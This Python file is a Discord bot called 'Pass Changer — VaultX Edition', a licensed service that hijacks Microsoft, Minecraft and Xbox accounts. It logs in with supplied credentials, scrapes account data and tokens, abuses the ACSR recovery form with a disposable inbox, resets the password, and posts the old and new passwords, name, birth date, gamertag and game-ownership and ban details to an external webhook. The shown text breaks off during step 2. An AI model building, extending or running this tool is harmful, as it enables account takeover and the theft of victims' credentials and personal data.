"""
PASS CHANGER BOT — VaultX Edition
VaultX Premium Automation
"""

import discord
from discord.ext import commands, tasks
from discord import app_commands
import asyncio
import json
import os
from datetime import datetime, timedelta
import random
import sys
from io import BytesIO
from PIL import Image
import threading
import traceback

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from automation.core import scrape_account_info
    from automation.acsr import submit_acsr_form
    from automation.acsr_continue import continue_acsr_flow
    from automation.reset_password import perform_password_reset
    from automation.captcha import download_captcha
    import tempmail
except ImportError as e:
    print(f"Warning: Could not import automation modules: {e}")
    print("Make sure automation/, gui/, utils/ folders are in the same directory")

from key_manager import (
    generate_key, redeem_key, get_user_license,
    has_valid_license, revoke_user_keys, list_all_keys,
    KEY_LABELS
)

# ═══════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════
ADMIN_ID              = 1128726626453168259
CONFIG_FILE           = "bot_config.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"
ACTIVE_SESSIONS_FILE  = "active_sessions.json"
STATS_FILE            = "bot_stats.json"

# Colors — vibrant, not faded
C_BRAND   = 0x5865F2   # blurple
C_SUCCESS = 0x2ECC71   # bright green
C_ERROR   = 0xFF0000   # red
C_WARN    = 0xFF8C00   # orange
C_INFO    = 0x00BFFF   # sky blue
C_GOLD    = 0xFFD700   # gold
C_PURPLE  = 0x9B59B6   # purple

FOOTER = "Pass Changer •  VaultX Premium"
SEP    = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ═══════════════════════════════════════════════
#  ANIMATED EMOJI SYSTEM
# ═══════════════════════════════════════════════
# All emoji IDs — format: (id, animated)
_EMOJI_DATA = {
    "Diamond":  (1467027260057063491, True),
    "one":      (1350424897373081720, False),
    "two":      (1350424935108968558, False),
    "three":    (1350424999068176465, False),
    "alert":    (1409282639994683412, True),
    "settings": (1413387675980927068, True),
    "BOOK":     (1460971715478949969, True),
    "mail":     (1482010517697593344, False),
    "updates":  (1374033841743724576, True),
    "pin":      (1478744541757575341, True),
    "SA_Tick":  (1341731331616280586, True),
    "record":   (1367686662104285295, True),
    "Cross":    (1464259649795788841, True),
}

# Cache: filled on_ready from guild emojis
_emoji_cache: dict = {}

def _build_emoji_cache(guilds):
    """Scan all guilds bot is in, cache any matching emoji names."""
    _emoji_cache.clear()
    for guild in guilds:
        for e in guild.emojis:
            if e.name in _EMOJI_DATA:
                _emoji_cache[e.name] = str(e)

def ge(name: str) -> str:
    """Get emoji string — cached local copy or original ID format."""
    if name in _emoji_cache:
        return _emoji_cache[name]
    d = _EMOJI_DATA.get(name)
    if not d:
        return "•"
    eid, anim = d
    return f"<{'a:' if anim else ':'}{name}:{eid}>"

# Shortcuts
def E_DIAMOND():  return ge("Diamond")
def E_ONE():      return ge("one")
def E_TWO():      return ge("two")
def E_THREE():    return ge("three")
def E_ALERT():    return ge("alert")
def E_SETTINGS(): return ge("settings")
def E_BOOK():     return ge("BOOK")
def E_MAIL():     return ge("mail")
def E_UPDATES():  return ge("updates")
def E_PIN():      return ge("pin")
def E_TICK():     return ge("SA_Tick")
def E_RECORD():   return ge("record")
def E_CROSS():    return ge("Cross")

# ═══════════════════════════════════════════════
#  LIVE PROGRESS TRACKER
# ═══════════════════════════════════════════════
# Steps: name, icon emoji name, substeps list
STEPS = [
    ("Account Preparation",  "mail",     [
        "Establishing browser session",
        "Navigating to login portal",
        "Submitting credentials",
        "Scraping account metadata",
        "Extracting security tokens",
    ]),
    ("Submitting ACSR Form", "BOOK",     [
        "Generating disposable inbox",
        "Loading ACSR form",
        "Populating account fields",
        "Preparing submission",
    ]),
    ("CAPTCHA Handling",     "alert",    [
        "Detecting CAPTCHA type",
        "Extracting CAPTCHA image",
        "Waiting for user input",
    ]),
    ("Continue Recovery",    "settings", [
        "Submitting ACSR form",
        "Waiting for server response",
        "Processing recovery link",
        "Validating reset token",
    ]),
    ("Password Reset",       "pin",      [
        "Opening reset portal",
        "Writing new credentials",
        "Confirming change",
    ]),
]

# Step states
PENDING = "pending"
ACTIVE  = "active"
DONE    = "done"
FAILED  = "failed"
WAITING = "waiting"


def _render_progress(step_states, sub_states, email, started, note=""):
    """Build the live progress embed."""
    lines = []
    for idx, ((name, icon, subs), state, ssubs) in enumerate(
        zip(STEPS, step_states, sub_states)
    ):
        icon_e = ge(icon)
        num    = idx + 1

        if state == DONE:
            lines.append(f"{E_TICK()} **Step {num} — {icon_e} {name}**")
        elif state == ACTIVE:
            lines.append(f"{E_RECORD()} **Step {num} — {icon_e} {name}**")
        elif state == FAILED:
            lines.append(f"{E_CROSS()} **Step {num} — {icon_e} {name}**")
        elif state == WAITING:
            lines.append(f"{E_ALERT()} **Step {num} — {icon_e} {name}**")
        else:
            lines.append(f"{E_DIAMOND()} Step {num} — {icon_e} {name}")

        if state in (ACTIVE, WAITING, FAILED):
            sub_names = STEPS[idx][2]
            for sub_name, sub_st in zip(sub_names, ssubs):
                if sub_st == DONE:
                    lines.append(f"　　{E_TICK()}  {sub_name}")
                elif sub_st == ACTIVE:
                    lines.append(f"　　{E_RECORD()}  **{sub_name}**")
                elif sub_st == FAILED:
                    lines.append(f"　　{E_CROSS()}  {sub_name}")
                else:
                    lines.append(f"　　{E_UPDATES()}  {sub_name}")

        lines.append("")

    elapsed    = int((datetime.now() - started).total_seconds())
    m, s       = divmod(elapsed, 60)
    time_str   = f"{m}m {s}s" if m else f"{s}s"

    if FAILED in step_states:
        color = C_ERROR
    elif all(x == DONE for x in step_states):
        color = C_SUCCESS
    elif ACTIVE in step_states or WAITING in step_states:
        color = C_BRAND
    else:
        color = 0x23272A

    desc = "\n".join(lines)
    if note:
        desc += f"\n{SEP}\n{note}"

    e = discord.Embed(
        title=f"{E_DIAMOND()}  VaultX — Recovery Pipeline",
        description=desc,
        color=color,
        timestamp=datetime.now()
    )
    e.add_field(name=f"{E_MAIL()}  Target",   value=f"`{email}`", inline=True)
    e.add_field(name=f"{E_UPDATES()}  Elapsed", value=time_str,   inline=True)
    e.set_footer(text=FOOTER)
    return e


class Progress:
    """Holds and edits a single live progress message."""

    def __init__(self, email, channel, started):
        self.email   = email
        self.channel = channel
        self.started = started
        self.msg     = None
        n = len(STEPS)
        self.step_states = [PENDING] * n
        self.sub_states  = [[PENDING] * len(s[2]) for s in STEPS]

    async def send(self):
        self.msg = await self.channel.send(
            embed=_render_progress(self.step_states, self.sub_states, self.email, self.started)
        )

    async def _edit(self, note=""):
        if self.msg:
            try:
                await self.msg.edit(embed=_render_progress(
                    self.step_states, self.sub_states, self.email, self.started, note
                ))
            except Exception:
                pass

    async def step_start(self, i, note=""):
        self.step_states[i] = ACTIVE
        self.sub_states[i]  = [PENDING] * len(STEPS[i][2])
        await self._edit(note)

    async def sub_start(self, i, j):
        self.sub_states[i][j] = ACTIVE
        await self._edit()

    async def sub_done(self, i, j):
        self.sub_states[i][j] = DONE
        await self._edit()

    async def step_done(self, i, note=""):
        self.step_states[i] = DONE
        self.sub_states[i]  = [DONE] * len(STEPS[i][2])
        await self._edit(note)

    async def step_fail(self, i, note=""):
        self.step_states[i] = FAILED
        await self._edit(note)

    async def step_wait(self, i, note=""):
        self.step_states[i] = WAITING
        await self._edit(note)


# ═══════════════════════════════════════════════
#  DATA MANAGER  (identical logic, same as original)
# ═══════════════════════════════════════════════
class BotDataManager:
    def __init__(self):
        # Load config — env var WEBHOOK_URL overrides saved file (fixes GitHub Actions reset)
        default_webhook = os.environ.get("WEBHOOK_URL", "")
        self.config = self.load_json(CONFIG_FILE, {
            "webhook_url": default_webhook, "bot_enabled": True, "max_concurrent_users": 10
        })
        # If file exists but webhook is empty, fill from env
        if not self.config.get("webhook_url") and default_webhook:
            self.config["webhook_url"] = default_webhook
        self.authorized_users = self.load_json(AUTHORIZED_USERS_FILE, {
            str(ADMIN_ID): {"authorized": True, "added_by": "system", "added_at": str(datetime.now())}
        })
        self.active_sessions     = {}
        self.otp_data            = {}
        self.processing_sessions = {}
        self.stats = self.load_json(STATS_FILE, {
            "total_processed": 0, "total_success": 0,
            "total_failed": 0, "users_served": {}
        })

    def load_json(self, filename, default):
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    return json.load(f)
            except Exception:
                pass
        return default

    def save_json(self, filename, data):
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        # Auto-commit to git so data persists across GitHub Actions restarts
        self._git_commit(filename)

    def _git_commit(self, filename):
        """Push changed file back to repo so it survives runner restarts."""
        import subprocess
        try:
            # Only run if we're inside a git repo (i.e. GitHub Actions)
            is_git = subprocess.run(
                ["git", "rev-parse", "--is-inside-work-tree"],
                capture_output=True, text=True
            ).returncode == 0
            if not is_git:
                return

            subprocess.run(["git", "add", filename], check=True, capture_output=True)

            # Check if there's actually something to commit
            diff = subprocess.run(
                ["git", "diff", "--cached", "--quiet"],
                capture_output=True
            )
            if diff.returncode == 0:
                return  # Nothing changed, skip commit

            subprocess.run([
                "git", "commit", "-m",
                f"chore: auto-save {filename} [skip ci]"
            ], check=True, capture_output=True)

            subprocess.run(["git", "push"], check=True, capture_output=True)
            print(f"✅ Auto-saved {filename} to repo")
        except Exception as e:
            print(f"⚠️ Git auto-save failed for {filename}: {e}")

    def save_config(self):           self.save_json(CONFIG_FILE, self.config)
    def save_authorized_users(self):  self.save_json(AUTHORIZED_USERS_FILE, self.authorized_users)
    def save_stats(self):            self.save_json(STATS_FILE, self.stats)

    def is_authorized(self, user_id):
        return str(user_id) in self.authorized_users and \
               self.authorized_users[str(user_id)]["authorized"]

    def authorize_user(self, user_id, by_admin):
        self.authorized_users[str(user_id)] = {
            "authorized": True, "added_by": str(by_admin), "added_at": str(datetime.now())
        }
        self.save_authorized_users()

    def revoke_user(self, user_id):
        self.authorized_users.pop(str(user_id), None)
        self.save_authorized_users()

    def generate_otp(self, user_id):
        otp = ''.join([str(random.randint(0, 9)) for _ in range(6)])
        self.otp_data[user_id] = {
            "otp": otp, "expires": datetime.now() + timedelta(minutes=5), "attempts": 0
        }
        return otp

    def verify_otp(self, user_id, otp):
        if user_id not in self.otp_data:
            return False, "No OTP requested. Use `/request_otp` first."
        data = self.otp_data[user_id]
        if datetime.now() > data["expires"]:
            del self.otp_data[user_id]
            return False, "OTP expired. Request a new one."
        if data["attempts"] >= 3:
            del self.otp_data[user_id]
            return False, "Maximum attempts exceeded."
        if data["otp"] == otp:
            del self.otp_data[user_id]
            self.active_sessions[user_id] = {"authenticated": True, "auth_time": datetime.now()}
            return True, "Authentication successful!"
        data["attempts"] += 1
        return False, f"Invalid OTP. {3 - data['attempts']} attempts remaining."

    def is_authenticated(self, user_id):
        if user_id not in self.active_sessions:
            return False
        auth_time = self.active_sessions[user_id].get("auth_time")
        if isinstance(auth_time, str):
            auth_time = datetime.fromisoformat(auth_time)
        if datetime.now() - auth_time > timedelta(hours=24):
            del self.active_sessions[user_id]
            return False
        return True

    def logout(self, user_id):
        self.active_sessions.pop(user_id, None)

    def update_stats(self, user_id, success):
        self.stats["total_processed"] += 1
        if success:
            self.stats["total_success"] += 1
        else:
            self.stats["total_failed"] += 1
        u = str(user_id)
        self.stats["users_served"].setdefault(u, {"processed": 0, "success": 0})
        self.stats["users_served"][u]["processed"] += 1
        if success:
            self.stats["users_served"][u]["success"] += 1
        self.save_stats()


# ═══════════════════════════════════════════════
#  BOT SETUP
# ═══════════════════════════════════════════════
def generate_elite_password():
    return "VaultX" + ''.join([str(random.randint(0, 9)) for _ in range(6)])

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot          = commands.Bot(command_prefix="!", intents=intents, help_command=None)
data_manager = BotDataManager()


# ═══════════════════════════════════════════════
#  EMBED HELPERS
# ═══════════════════════════════════════════════
def mk(title, desc, color, fields=None):
    e = discord.Embed(title=title, description=desc, color=color, timestamp=datetime.now())
    if fields:
        for f in fields:
            e.add_field(name=f["name"], value=f["value"], inline=f.get("inline", False))
    e.set_footer(text=FOOTER)
    return e

def ok(t, d, f=None):    return mk(f"{E_TICK()}  {t}",    d, C_SUCCESS, f)
def err(t, d, f=None):   return mk(f"{E_CROSS()}  {t}",   d, C_ERROR,   f)
def info(t, d, f=None):  return mk(f"{E_UPDATES()}  {t}", d, C_INFO,    f)
def warn(t, d, f=None):  return mk(f"{E_ALERT()}  {t}",   d, C_WARN,    f)
def brand(t, d, f=None): return mk(f"{E_DIAMOND()}  {t}", d, C_BRAND,   f)
def adm(t, d, f=None):   return mk(f"{E_SETTINGS()}  {t}",d, C_GOLD,    f)


# ═══════════════════════════════════════════════
#  WEBHOOK
# ═══════════════════════════════════════════════
async def send_to_webhook(result):
    url = data_manager.config.get("webhook_url")
    if not url:
        return
    payload = {
        "embeds": [{
            "title": f"{E_TICK()}  Account Successfully Processed",
            "color": C_SUCCESS,
            "fields": [
                {"name": f"{E_MAIL()}  Email",        "value": f"`{result['email']}`",                    "inline": False},
                {"name": "🔓  Old Password",           "value": f"||`{result['old_password']}`||",          "inline": True},
                {"name": "🔒  New Password",           "value": f"`{result['new_password']}`",              "inline": True},
                {"name": "👤  Name",                   "value": result.get("name", "—"),                   "inline": True},
                {"name": "🎂  DOB",                    "value": result.get("dob", "—"),                    "inline": True},
                {"name": "🌍  Region",                 "value": result.get("region", "—"),                 "inline": True},
                {"name": "💬  Skype ID",               "value": result.get("skype_id", "—"),               "inline": True},
                {"name": "📧  Skype Email",            "value": result.get("skype_email", "—"),            "inline": True},
                {"name": "🎮  Gamertag",               "value": result.get("gamertag", "—"),               "inline": True},
                {"name": "⬛  ━━━━━━ MINECRAFT ━━━━━━", "value": "",                                     "inline": False},
                {"name": "⛏️  Java Edition",           "value": result.get("mc_java",     "⚠️ Skipped"),  "inline": True},
                {"name": "📱  Bedrock Edition",        "value": result.get("mc_bedrock",  "⚠️ Skipped"),  "inline": True},
                {"name": "🧑  MC Username",            "value": f"`{result.get('mc_username','—')}`",      "inline": True},
                {"name": "⬛  ━━━━━━ XBOX ━━━━━━",     "value": "",                                     "inline": False},
                {"name": "🎮  Game Pass",              "value": result.get("xbox_gp",     "⚠️ Skipped"),  "inline": True},
                {"name": "👑  Game Pass Ultimate",     "value": result.get("xbox_gpu",    "⚠️ Skipped"),  "inline": True},
                {"name": "💻  PC Game Pass",           "value": result.get("xbox_pc_gp",  "⚠️ Skipped"),  "inline": True},
                {"name": "⬛  ━━━━━━ BAN STATUS ━━━━━━","value": "",                                    "inline": False},
                {"name": "🔨  Hypixel",                "value": result.get("hypixel_ban", "⚠️ Skipped"),  "inline": True},
                {"name": "🍩  Donut SMP",              "value": result.get("donut_ban",   "⚠️ Skipped"),  "inline": True},
            ],
            "footer": {"text": f"Operator: {result.get('user_id', '?')}  •  {FOOTER}"},
            "timestamp": datetime.now().isoformat()
        }]
    }
    import aiohttp
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(url, json=payload)
    except Exception as ex:
        print(f"Webhook error: {ex}")


# ═══════════════════════════════════════════════
#  CORE PROCESSING  (same logic as original, new UI)
# ═══════════════════════════════════════════════
async def process_account_full(email, password, user_id, channel):
    loop    = asyncio.get_event_loop()
    started = datetime.now()
    prog    = Progress(email, channel, started)
    await prog.send()

    try:
        # ── Step 1: Scrape account info ──────────────
        await prog.step_start(0)
        await prog.sub_start(0, 0)

        account_info = await loop.run_in_executor(None, scrape_account_info, email, password)

        for j in range(len(STEPS[0][2])):
            await prog.sub_done(0, j)

        if not account_info or account_info.get("error"):
            msg = (account_info or {}).get("error", "Could not login")
            await prog.step_fail(0, f"{E_CROSS()}  **{msg}**")
            data_manager.update_stats(user_id, False)
            return {"status": "failed", "error": msg}

        await prog.step_done(0)

        # ── Step 2: Submit ACSR form ─────────────────
        await prog.step_start(1)
        